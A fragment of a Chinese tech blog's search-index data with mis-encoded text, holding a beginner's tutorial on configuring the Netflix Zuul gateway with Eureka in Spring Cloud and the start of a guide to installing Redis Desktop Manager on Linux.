navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¾®æœåŠ¡"},{title:"Zuul å…¥é—¨æ•™ç¨‹ - åŸºç¡€ç¯‡",url:"/posts/316633c.html",text:'Zuul ä»‹ç»Zuul æ˜¯ä»€ä¹ˆZuul æ˜¯ç”± Netflix å­µåŒ–çš„ä¸€ä¸ªè‡´åŠ›äº â€œç½‘å…³â€ è§£å†³æ–¹æ¡ˆçš„å¼€æºç»„ä»¶ï¼Œåœ¨åŠ¨æ€è·¯ç”±ã€ç›‘æ§ã€å¼¹æ€§ã€æœåŠ¡æ²»ç†ä»¥åŠå®‰å…¨æ–¹é¢èµ·ç€ä¸¾è¶³è½»é‡çš„ä½œç”¨ã€‚ä» 2012 å¹´ 3 æœˆä»¥æ¥ï¼Œé™†ç»­å‘å¸ƒäº† Zuul 1.0 ä¸ Zuul 2.0 ç‰ˆæœ¬ï¼Œåç» Pivotal å…¬å¸å°† Zuul 1.0 æ•´åˆåˆ° Spring Cloud çš„ç”Ÿæ€ç³»ç»Ÿä¸­ï¼Œå³ç°åœ¨çš„ Spring Cloud Zuulã€‚åœ¨ Netflix å®˜æ–¹çš„è§£é‡Šä¸­ï¼ŒZuul æ˜¯ä»è®¾å¤‡å’Œç½‘ç«™åˆ°åç«¯åº”ç”¨ç¨‹åºæ‰€æœ‰è¯·æ±‚çš„å‰é—¨ï¼Œä¸ºå†…éƒ¨æœåŠ¡æä¾›å¯é…ç½®çš„å¯¹å¤– URL åˆ°æœåŠ¡çš„æ˜ å°„å…³ç³»ï¼ŒåŸºäº JVM çš„åç«¯è·¯ç”±å™¨ã€‚å…¶åº•å±‚åŸºäº Servlet å®ç°ï¼Œæœ¬è´¨ç»„ä»¶æ˜¯ä¸€ç³»åˆ— Filter æ‰€æ„æˆçš„è´£ä»»é“¾ï¼Œå¹¶ä¸” Zuul çš„é€»è¾‘å¼•æ“ä¸ Filter å¯ç”¨å…¶ä»–åŸºäº JVM çš„ç¼–ç¨‹è¯­è¨€ç¼–å†™ï¼ˆæ¯”å¦‚ Groovyï¼‰ã€‚Zuul é»˜è®¤é›†æˆäº† Ribbonã€Hystrixï¼Œå…¶ä¸­ Zuul 2.x ç‰ˆæœ¬æ”¹åŠ¨ç›¸è¾ƒ 1.x æ¯”è¾ƒå¤§ï¼Œåº•å±‚ä½¿ç”¨äº† Nettyã€‚è™½ç„¶ Netflix å·²ç»åœ¨ 2018 å¹´ 5 æœˆå¼€æºäº† Zuul 2.xï¼Œä½†ç”±äº Zuul 2.x åœ¨ Spring Cloud Gateway å­µåŒ–ä¹‹å‰ä¸€ç›´è·³ç¥¨å‘å¸ƒï¼Œè€Œä¸” Spring Cloud Gateway ç›®å‰å·²ç»å­µåŒ–æˆåŠŸï¼Œç›¸è¾ƒäº Zuul 1.x åœ¨åŠŸèƒ½ä»¥åŠæ€§èƒ½ä¸Šéƒ½æœ‰æ˜æ˜¾çš„æå‡ã€‚å› æ­¤åœ¨ Spring Boot 2.0 ä»¥ä¸Šç‰ˆæœ¬ä¸­ï¼Œå¹¶æ²¡æœ‰å¯¹ Zuul 2.0 ä»¥ä¸Šæœ€æ–°é«˜æ€§èƒ½ç‰ˆæœ¬è¿›è¡Œé›†æˆï¼Œä»ç„¶ä½¿ç”¨ Zuul 1.x é Reactor æ¨¡å¼ï¼ˆåŸºäº Servlet 2.5 é˜»å¡æ¶æ„ï¼‰çš„æ—§ç‰ˆæœ¬ã€‚æ›´å¤šä»‹ç»å¯å‚è€ƒï¼šZuul é¡¹ç›®ã€Zuul å®˜æ–¹è‹±æ–‡æ•™ç¨‹ã€Spring Cloud Zuul å®˜æ–¹ä¸­æ–‡æ–‡æ¡£ Zuul çš„ç‰¹æ€§ä¸»è¦ç‰¹æ€§åŒ…æ‹¬ï¼šè®¤è¯å’Œé‰´æƒã€å‹åŠ›æ§åˆ¶ã€åŠ¨æ€è·¯ç”±ã€è´Ÿè½½å‰Šå‡ã€é™æ€å“åº”å¤„ç†ã€ä¸»åŠ¨æµé‡ç®¡ç†ã€é‡‘ä¸é›€æµ‹è¯• Zuul 1.x ä¸ Zuul 2.x å¯¹æ¯”Zuul 1.x æ˜¯ä¸€ä¸ªåŸºäº Servlet 2.5 çš„åŒæ­¥é˜»å¡ I/O ç½‘å…³ï¼Œä¸æ”¯æŒä»»ä½•é•¿è¿æ¥ï¼ˆå¦‚ WebSocketï¼‰ã€‚Zuul 1.x çš„è®¾è®¡å’Œ Nginx æ¯”è¾ƒåƒï¼Œæ¯æ¬¡ I/O æ“ä½œéƒ½æ˜¯ä»å·¥ä½œçº¿ç¨‹æ± ä¸­é€‰æ‹©ä¸€ä¸ªæ¥æ‰§è¡Œï¼Œè¯·æ±‚çº¿ç¨‹è¢«é˜»å¡åˆ°å·¥ä½œçº¿ç¨‹å®Œæˆä¸ºæ­¢ï¼›ä½†æ˜¯å·®åˆ«æ˜¯ Nginx æ˜¯åŸºäº C/C++ å®ç°ï¼Œè€Œ Zuul 1.x æ˜¯ä½¿ç”¨ Java å®ç°ï¼Œè€Œ JVM æœ¬èº«ä¼šæœ‰ç¬¬ä¸€æ¬¡åŠ è½½è¾ƒæ…¢çš„æƒ…å†µï¼Œä½¿å¾— Zuul 1.x çš„æ€§èƒ½ç›¸å¯¹è¾ƒå·®ã€‚æ ¹æ®å®˜æ–¹æä¾›çš„åŸºå‡†æµ‹è¯•ï¼ŒSpring Cloud Gateway çš„ RPSï¼ˆæ¯ç§’è¯·æ±‚æ•°ï¼‰æ˜¯ Zuul 1.x çš„ 1.6 å€ï¼Œå¹³å‡å»¶è¿Ÿæ˜¯ Zuul 1.x çš„ä¸€åŠã€‚ Zuul 2.x çš„ç†å¿µæ›´å…ˆè¿›ï¼ŒåŸºäº Netty çš„å¼‚æ­¥éé˜»å¡ I/O æ¨¡å‹ï¼Œæ”¯æŒé•¿è¿æ¥ã€‚Zuul 2.x æœ€å¤§çš„æ”¹è¿›å°±æ˜¯åŸºäº Netty Server å®ç°äº†å¼‚æ­¥éé˜»å¡ I/O æ¥æ¥å…¥è¯·æ±‚ï¼ŒåŒæ—¶åŸºäº Netty Client å®ç°äº†åˆ°åç«¯ä¸šåŠ¡æœåŠ¡ API çš„è¯·æ±‚ï¼Œè¿™æ ·å°±å¯ä»¥å®ç°æ›´é«˜çš„æ€§èƒ½ã€æ›´ä½çš„å»¶è¿Ÿã€‚æ­¤å¤–ä¹Ÿè°ƒæ•´äº† Filter ç±»å‹ï¼Œå°†åŸæ¥çš„ä¸‰ä¸ªæ ¸å¿ƒ Filter æ˜¾å¼å‘½åä¸ºï¼šInbound Filterã€Endpoint Filter å’Œ Outbound Filterã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼ŒZuul 2.x ä¸ Spring Cloud Gateway çš„æ€§èƒ½å·®ä¸å¤šã€‚Zuul 2.x çš„æ ¸å¿ƒåŠŸèƒ½å¦‚ä¸‹ï¼š GZip HTTP/2 Retries Mutual TLS WebSocket/SSE Proxy Protocol Load Balancing Request Passport Request Attempts Status Categories Service Discovery Connection Pooling Origin Concurrency Protection Zuul å…¥é—¨æ¡ˆä¾‹è¿™é‡Œçš„æ¡ˆä¾‹å°†ä½¿ç”¨åˆ°çš„ Spring Cloud ç»„ä»¶æ˜¯ Eureka ä¸ Zuulï¼Œå¦å¤–å†ä½¿ç”¨ä¸€ä¸ªæ™®é€šæœåŠ¡ä½œä¸º Zuul è·¯ç”±çš„ä¸‹çº§æœåŠ¡ï¼Œæ¥æ¨¡æ‹ŸçœŸå®å¼€å‘ä¸­çš„ä¸€æ¬¡è·¯ç”±è¿‡ç¨‹ã€‚ 1. ç‰ˆæœ¬è¯´æ˜åœ¨æœ¬æ–‡ä¸­ï¼Œé»˜è®¤ä½¿ç”¨çš„ Spring Cloud ç‰ˆæœ¬æ˜¯ Finchley.RELEASEï¼Œå¯¹åº”çš„ Spring Boot ç‰ˆæœ¬æ˜¯ 2.0.3ï¼ŒZuul ç‰ˆæœ¬æ˜¯ 1.xï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç  2. åˆ›å»º Maven çˆ¶çº§ Pom å·¥ç¨‹åœ¨çˆ¶å·¥ç¨‹é‡Œé¢é…ç½®å¥½å·¥ç¨‹éœ€è¦çš„çˆ¶çº§ä¾èµ–ï¼Œç›®çš„æ˜¯ä¸ºäº†æ›´æ–¹ä¾¿ç®¡ç†ä¸ç®€åŒ–é…ç½®ï¼Œå…·ä½“ Maven é…ç½®å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;!-- åˆ©ç”¨ä¼ é€’ä¾èµ–ï¼Œå…¬å…±éƒ¨åˆ† --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;!-- ç®¡ç†ä¾èµ– --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Finchley.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!--æ³¨æ„ï¼šè¿™é‡Œéœ€è¦æ·»åŠ ä»¥ä¸‹é…ç½®ï¼Œå¦åˆ™å¯èƒ½ä¼šæœ‰å„ç§ä¾èµ–é—®é¢˜ --&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt; 3. åˆ›å»º Eureka Server å·¥ç¨‹åˆ›å»º Eureka Server çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼Œéœ€è¦å¼•å…¥ spring-cloud-starter-netflix-eureka-server 123456&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; åˆ›å»º Eureka Server çš„å¯åŠ¨ä¸»ç±»ï¼Œè¿™é‡Œæ·»åŠ ç›¸åº”æ³¨è§£ï¼Œä½œä¸ºç¨‹åºçš„å…¥å£ï¼š 12345678@SpringBootApplication@EnableEurekaServerpublic class EurekaServerApplication { public static void main(String[] args){ SpringApplication.run(EurekaServerApplication.class, args); }} æ·»åŠ  Eureka Server éœ€è¦çš„ application.yml é…ç½®æ–‡ä»¶åˆ°å·¥ç¨‹ä¸­ 1234567891011server: port: 8090eureka: instance: hostname: 127.0.0.1 client: registerWithEureka: false fetchRegistry: false serviceUrl: defaultZone: http://${eureka.instance.hostname}:${server.port}/eureka/ 4. åˆ›å»º Provider ä¸‹æ¸¸æœåŠ¡å·¥ç¨‹åˆ›å»º Provider çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼Œéœ€è¦å¼•å…¥ spring-cloud-starter-netflix-eureka-client 123456&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; åˆ›å»º Provider çš„å¯åŠ¨ä¸»ç±»ï¼Œæ·»åŠ æ³¨è§£ @EnableDiscoveryClientï¼Œå°†æœåŠ¡æ³¨å†Œåˆ° Eureka Serverï¼š 12345678@SpringBootApplication@EnableDiscoveryClientpublic class ProviderApplication { public static void main(String[] args){ SpringApplication.run(ProviderApplication.class, args); }} åœ¨ application.yml æ–‡ä»¶ä¸­æŒ‡å®šæœåŠ¡åç§°ï¼ˆprovider-serviceï¼‰ã€æ³¨å†Œä¸­å¿ƒåœ°å€ä¸ç«¯å£å·ï¼š 12345678910111213server: port: 9090spring: application: name: provider-serviceeureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: true åˆ›å»ºç”¨äºæµ‹è¯•çš„ Controller ç±»ï¼š 12345678@RestControllerpublic class ProviderController { @GetMapping("/provider/add") public String add(Integer a, Integer b, HttpServletRequest request) { return "From Port: " + request.getServerPort() + ", Result: " + (a + b); }} 5. åˆ›å»º Zuul Server å·¥ç¨‹åˆ›å»º Zuul Server çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼Œéœ€è¦å¼•å…¥ spring-cloud-starter-netflix-eureka-clientã€spring-cloud-starter-netflix-zuul 12345678910&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-zuul&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; åˆ›å»º Zuul Server çš„å¯åŠ¨ä¸»ç±»ï¼Œæ·»åŠ æ³¨è§£ @EnableZuulProxyã€@EnableDiscoveryClient 123456789@EnableZuulProxy@EnableDiscoveryClient@SpringBootApplicationpublic class ZuulServerApplication { public static void main(String[] args) { SpringApplication.run(ZuulServerApplication.class, args); }} åœ¨ application.yml æ–‡ä»¶ä¸­æŒ‡å®šæœåŠ¡åç§°ï¼ˆzuul-serverï¼‰ã€æ³¨å†Œä¸­å¿ƒåœ°å€ä¸ç«¯å£å·ï¼š 1234567891011121314151617181920server: port: 8092spring: application: name: zuul-servereureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: true#è·¯ç”±æ˜ å°„è§„åˆ™zuul: routes: provider-service: path: /provider/service/** serviceId: provider-service 6. æµ‹è¯•æ•ˆæœ åˆ†åˆ«å¯åŠ¨ eureka-serverã€provider-serviceã€zuul-server åº”ç”¨ è®¿é—® provider-service åº”ç”¨ï¼šhttp://127.0.0.1:9090/provider/add?a=3&amp;b=5 æ–¹å¼ä¸€ï¼šé€šè¿‡ zuul-server è®¿é—® provider-service åº”ç”¨ï¼šhttp://127.0.0.1:8092/provider-service/provider/add?a=3&amp;b=5ï¼Œprovider-service ä¸ºæœåŠ¡å®ä¾‹çš„åç§° æ–¹å¼äºŒï¼šé€šè¿‡ zuul-server è®¿é—® provider-service åº”ç”¨ï¼šhttp://127.0.0.1:8092/provider/service/provider/add?a=3&amp;b=6ï¼Œè¿™é‡Œä½¿ç”¨äº†è·¯ç”±æ˜ å°„è§„åˆ™ /provider/service/** è‹¥ä¸Šé¢é€šè¿‡ zuul-server è®¿é—® provider-service åº”ç”¨åï¼Œéƒ½å¯ä»¥æ­£å¸¸è¿”å›ç»“æœï¼Œåˆ™è¯´æ˜ Zuul æˆåŠŸå‘æŒ¥äº†ç½‘å…³çš„ä½œç”¨æç¤ºï¼šè‹¥åœ¨ Zuul çš„é…ç½®æ–‡ä»¶ä¸­æŒ‡å®šäº†è·¯ç”±æ˜ å°„è§„åˆ™ï¼Œå½“å‘ Zuul Server å‘èµ·è¯·æ±‚çš„æ—¶å€™ï¼ŒZuul ä¼šå» Eureka æ³¨å†Œä¸­å¿ƒæ‹‰å–æœåŠ¡åˆ—è¡¨ï¼Œå¦‚æœå‘ç°æœ‰æŒ‡å®šçš„è·¯ç”±æ˜ å°„è§„åˆ™ï¼Œå°±ä¼šæŒ‰ç…§æ˜ å°„è§„åˆ™è·¯ç”±åˆ°ç›¸åº”çš„æœåŠ¡æ¥å£ Zuul è·¯ç”±é…ç½®è·¯ç”±é…ç½®ç®€åŒ–12345zuul: routes: client-a: path: /client/** serviceId: client-a ä¸Šè¿°çš„é…ç½®ä¸­ï¼Œæ˜¯ä¸€ä¸ªä» /client/** è·¯ç”±åˆ° client-a æœåŠ¡çš„ä¸€ä¸ªæ˜ å°„è§„åˆ™ï¼Œå®ƒå¯ä»¥ç®€åŒ–æˆå¦‚ä¸‹çš„ç®€å•é…ç½®ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒZull ä¼šä¸º client-a æœåŠ¡æ·»åŠ ä¸€ä¸ªé»˜è®¤çš„æ˜ å°„è§„åˆ™ /client/** 123zuul: routes: client-a: /client/** å•å®ä¾‹ URL æ˜ å°„é™¤äº†è·¯ç”±åˆ°æœåŠ¡å¤–ï¼Œè¿˜æ”¯æŒè·¯ç”±åˆ°ç‰©ç†ç¬›å­ï¼Œå°† serviceId æ›¿æ¢ä¸º url å³å¯ï¼š 12345zuul: routes: client-a: path: /client/** serviceId: http://127.0.0.1:8080 å¤šå®ä¾‹è·¯ç”±æ˜ å°„åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼ŒZuul ä¼šä½¿ç”¨ Eureka ä¸­é›†æˆçš„è´Ÿè½½å‡è¡¡åŠŸèƒ½ï¼Œå¦‚æœæƒ³è¦ä½¿ç”¨ Ribbon çš„å®¢æˆ·ç«¯è´Ÿè½½å‡è¡¡åŠŸèƒ½ï¼Œå°±éœ€è¦æŒ‡å®šä¸€ä¸ª serviceIdï¼Œæ­¤æ“ä½œéœ€è¦ç¦æ­¢ Ribbon ä½¿ç”¨ Eurekaã€‚æç¤ºï¼šSpring Cloud åœ¨ E ç‰ˆæœ¬ä¹‹åï¼Œæ–°å¢äº†è´Ÿè½½å‡è¡¡ç­–ç•¥çš„é…ç½®ï¼š 123456789101112131415zuul: routes: client-a: path: /ribbon/** serviceId: client-aribbon: eureka: enabled: falseclient-a: ribbon: NIWSServerListClassName: com.netflix.loadbalancer.ConfigurationBasedServerList NFLoadBalancerRuleClassName: com.netflix.loadbalancer.RoundRobinRule listOfServers: 127.0.0.1:8001,127.0.0.1:8002 Forward æœ¬åœ°è·³è½¬åœ¨ Zuul ä¸­æœ‰æ—¶å€™ä¼šåšä¸€äº›é€»è¾‘å¤„ç†ï¼Œå…ˆåœ¨ç½‘å…³ï¼ˆZuul Serverï¼‰ä¸­å†™å¥½ä¸€ä¸ªæ¥å£ï¼Œå¦‚ä¸‹ï¼š 12345678@RestControllerpublic class TestController { @GetMapping("/add") public String add(Integer a, Integer b){ return "æœ¬åœ°è·³è½¬: " + (a + b); }} å¦‚æœå¸Œæœ›åœ¨è®¿é—® /provider/service æ¥å£çš„æ—¶å€™ï¼Œè·³è½¬åˆ°ä¸Šé¢çš„ add æ–¹æ³•ä¸Šæ¥å¤„ç†ï¼Œå°±éœ€è¦ç”¨åˆ° Zuul çš„æœ¬åœ°è·³è½¬ï¼Œé…ç½®å¦‚ä¸‹ï¼š 12345zuul: routes: provider-service: path: /provider/service/** url: forward:/add å½“è®¿é—® http://127.0.0.1:8092/provider/service?a=2&amp;b=3ï¼Œä¼šè·³è½¬åˆ° TestController ç±»çš„ add æœ¬åœ°æ–¹æ³• ç›¸åŒè·¯å¾„çš„åŠ è½½è§„åˆ™æœ‰ä¸€ç§ç‰¹æ®Šçš„æƒ…å†µï¼Œä¸ºä¸€ä¸ªæ˜ å°„è·¯å¾„æŒ‡å®šå¤šä¸ª serviceId æ—¶ï¼Œé‚£ä¹ˆ Zuul æ€»æ˜¯ä¼šè·¯ç”±åˆ° YML é…ç½®æ–‡ä»¶ä¸­æœ€åé¢çš„é‚£ä¸ªæœåŠ¡ã€‚å³åœ¨ YML è§£é‡Šå™¨å·¥ä½œçš„æ—¶å€™ï¼Œå¦‚æœåŒä¸€ä¸ªæ˜ å°„è·¯å¾„å¯¹åº”å¤šä¸ªæœåŠ¡ï¼ŒæŒ‰ç…§åŠ è½½é¡ºåºï¼Œæœ€ååŠ è½½çš„æ˜ å°„è§„åˆ™ä¼šæŠŠä¹‹å‰çš„æ˜ å°„è§„åˆ™è¦†ç›–æ‰ã€‚ 12345678zuul: routes: client-a: path: /client/** serviceId: client-a client-b: path: /client/** serviceId: client-b è·¯ç”±é€šé…ç¬¦æ­¤å¤–ï¼Œæ˜ å°„è·¯å¾„ /client/** ä¹‹åçš„ /** ä¹Ÿå¤§æœ‰è®²ç©¶ï¼Œå…¶è¿˜å¯ä»¥é…ç½®ä¸º /* æˆ–è€… /?ï¼Œå…·ä½“è§„åˆ™å¦‚ä¸‹ï¼š Zuul åŠŸèƒ½é…ç½®è·¯ç”±å‰ç¼€åœ¨é…ç½®è·¯ç”±è§„åˆ™çš„æ—¶å€™ï¼Œå¯ä»¥é…ç½®ä¸€ä¸ªç»Ÿä¸€çš„ä»£ç†å‰ç¼€ï¼Œä¸‹æ¬¡é€šè¿‡ Zuul è®¿é—®åç«¯æ¥å£çš„æ—¶å€™å°±éœ€è¦åŠ ä¸Šè¿™ä¸ªåç¼€äº†ã€‚æç¤ºï¼Œè¯·æ±‚è·¯å¾„ä¼šå˜æˆ /pre/client/addï¼Œä½†å®é™…èµ·ä½œç”¨çš„æ˜¯ /client/addï¼Œå¯ä»¥ä½¿ç”¨ stripPrefix=false æ¥å…³é—­æ­¤åŠŸèƒ½ï¼›å…³é—­ä¹‹åï¼Œè¯·æ±‚è·¯å¾„æ˜¯ /pre/client/addï¼Œå®é™…èµ·ä½œç”¨çš„è¿˜æ˜¯ /pre/client/addï¼Œä¸€èˆ¬ä¸æ¨èä½¿ç”¨è¿™ä¸ªé…ç½®ã€‚ 1234567zuul: prefix: /pre routes: client-a: path: /client/** serviceId: client-a stripPrefix: false æ•æ„Ÿå¤´ä¿¡æ¯åœ¨æ„å»ºç³»ç»Ÿçš„æ—¶å€™ï¼Œä½¿ç”¨ HTTP çš„ header ä¼ å€¼æ˜¯ååˆ†æ–¹ä¾¿çš„ï¼Œåè®®çš„ä¸€äº›è®¤è¯ä¿¡æ¯é»˜è®¤ä¹Ÿåœ¨ header é‡Œï¼Œæ¯”å¦‚ Cookieï¼Œæˆ–è€…ä¹ æƒ¯æŠŠåŸºæœ¬è®¤è¯ä¿¡æ¯é€šè¿‡ BASE64 åŠ å¯†åæ”¾åœ¨ Authorization é‡Œé¢ï¼Œä½†æ˜¯å¦‚æœç³»ç»Ÿè¦å’Œå¤–éƒ¨ç³»ç»Ÿé€šä¿¡ï¼Œå°±å¯èƒ½ä¼šå‡ºç°è¿™äº›ä¿¡æ¯çš„æ³„æ¼ã€‚Zuul æ”¯æŒåœ¨é…ç½®æ–‡ä»¶é‡Œé¢æŒ‡å®šæ•æ„Ÿå¤´ï¼Œåˆ‡æ–­å®ƒå’Œä¸‹å±‚æœåŠ¡ä¹‹é—´çš„äº¤äº’ï¼Œé…ç½®å¦‚ä¸‹ï¼š 123456zuul: routes: client-a: path: /client/** serviceId: client-a sensitiveHeaders: Cookie,Set-Cookie,Authorization é‡å®šå‘é—®é¢˜å‡è®¾å®¢æˆ·ç«¯é€šè¿‡ Zuul è¯·æ±‚è®¤è¯æœåŠ¡ï¼Œè®¤è¯æˆåŠŸä¹‹åé‡å®šå‘åˆ°ä¸€ä¸ªæ¬¢è¿é¡µé¢ï¼Œä½†æ˜¯å‘ç°é‡å®šå‘çš„è¿™ä¸ªæ¬¢è¿é¡µé¢çš„ host å˜æˆäº†è¿™ä¸ªè®¤è¯æœåŠ¡çš„ hostï¼Œè€Œä¸æ˜¯ Zuul çš„ hostï¼Œç›´æ¥å¯¼è‡´äº†è®¤è¯æœåŠ¡åœ°å€çš„æš´éœ²ï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼Œæ­¤æ—¶å¯ä»¥ä½¿ç”¨ä¸‹è¿°é…ç½®æ¥è§£å†³ï¼š 123456zuul: add-host-header: true #è§£å†³é‡å®šå‘çš„headeré—®é¢˜ routes: client-a: path: /client/** serviceId: client-a æœåŠ¡å±è”½ä¸è·¯å¾„å±è”½æœ‰æ—¶å€™ä¸ºäº†é¿å…æŸäº›æœåŠ¡æˆ–è€…è·¯å¾„çš„ä¾µå…¥ï¼ŒåŠ å…¥ ignored-services ä¸ ignored-patterns ä¹‹åï¼Œå¯ä»¥å°†å®ƒä»¬å±è”½æ‰ï¼š 1234567zuul: ignored-services: client-b #å¿½ç•¥çš„æœåŠ¡ï¼Œé˜²æœåŠ¡ä¾µå…¥ ignored-patterns: /**/div/** #å¿½ç•¥çš„æ¥å£ï¼Œå±è”½æ¥å£ routes: client-a: path: /client/** serviceId: client-a ä¸‹ç¯‡ - Zuul å…¥é—¨æ•™ç¨‹ï¼ˆä¸­çº§ç¯‡ï¼‰ Zuul å…¥é—¨æ•™ç¨‹ - ä¸­çº§ç¯‡ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¾®æœåŠ¡"},{title:"Linux å®‰è£… RedisDesktopManager",url:"/posts/1302ed9d.html",text:'ç›¸å…³ç«™ç‚¹ RedisDesktopManager Github é¡¹ç›® RedisDesktopManager å®˜æ–¹å®‰è£…æ•™ç¨‹ RedisDesktopManager Github Releases RDM ä»‹ç»Redis Desktop Manager æ˜¯ä¸€æ¬¾èƒ½å¤Ÿè·¨å¹³å°ä½¿ç”¨çš„å¼€æº Redis å¯è§†åŒ–å·¥å…·ï¼Œä¸»è¦é’ˆå¯¹ Redis å¼€å‘è®¾è®¡ã€‚æ‹¥æœ‰ç›´è§‚å¼ºå¤§çš„å¯è§†åŒ–ç•Œé¢ï¼Œå…·å¤‡å®Œå–„å…¨é¢çš„æ•°æ®æ“ä½œåŠŸèƒ½ã€‚å¯ä»¥é’ˆå¯¹ç›®æ ‡ key æ‰§è¡Œ renameã€deleteã€addrowã€reload value ç­‰æ“ä½œï¼Œæ”¯æŒé€šè¿‡ SSH Tunnel è¿æ¥ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡å®ƒå¯¹ Redis è¿›è¡Œæ“ä½œç®¡ç†ï¼Œç®€åŒ–åŸæœ‰çš„å‘½ä»¤è¯­è¨€ï¼Œå……åˆ†å‘æŒ¥ Redis çš„ç‰¹æ€§ã€‚ç±»ä¼¼çš„ Redis å¯è§†åŒ–å·¥å…·ï¼Œè¿˜æœ‰ Fastoredisï¼ˆåŒºåˆ†å…è´¹ç‰ˆä¸ä¸“ä¸šç‰ˆï¼‰ã€‚ RDM å®‰è£…Snap å®‰è£… RDMå»ºè®®ç›´æ¥ä½¿ç”¨ Snap å®‰è£… Redis Desktop Managerï¼Œé¿å…ç¹æ‚çš„ç¼–è¯‘å®‰è£…è¿‡ç¨‹ï¼Œä¹Ÿæ–¹ä¾¿ä»¥åç®¡ç†è½¯ä»¶çš„æ›´æ–°ï¼›æ­¤å®‰è£…æ–¹å¼é€‚ç”¨äº CentOSã€Debianã€Ubuntu ç­‰ Linux å‘è¡Œç‰ˆï¼ŒSnap çš„å®‰è£…å’Œä½¿ç”¨å¯å‚è€ƒæœ¬ç«™æ•™ç¨‹ã€‚ 1234567891011121314151617181920212223# å®‰è£…# snap install redis-desktop-manager# æŸ¥çœ‹å®‰è£…çŠ¶æ€# snap list# åˆ›å»ºèœå•æ çš„å¿«æ·æ–¹å¼# vim /usr/share/applications/redis-desktop-manager.desktop[Desktop Entry]Version=1.0Name=Redis Desktop ManagerComment=Redis Desktop ManagerType=ApplicationCategories=Development;Exec=/snap/bin/redis-desktop-manager.rdm %UTerminal=falseStartupNotify=trueIcon=/var/lib/snapd/snap/redis-desktop-manager/current/usr/share/pixmaps/rdm.png# ä½¿ç”¨å‘½ä»¤æ¥å¯åŠ¨ï¼ˆä½¿ç”¨æ™®é€šç”¨æˆ·æƒé™ï¼‰$ /snap/bin/redis-desktop-manager.rdm# æˆ–è€…èœå•æ å¯¼èˆªåˆ°ï¼šåº”ç”¨ç¨‹åº --&gt; ç¼–ç¨‹ --&gt; Redis Desktop Managerï¼Œç›´æ¥ç‚¹å‡»å¿«æ·æ–¹å¼æ¥å¯åŠ¨åº”ç”¨ Flatpak å®‰è£… 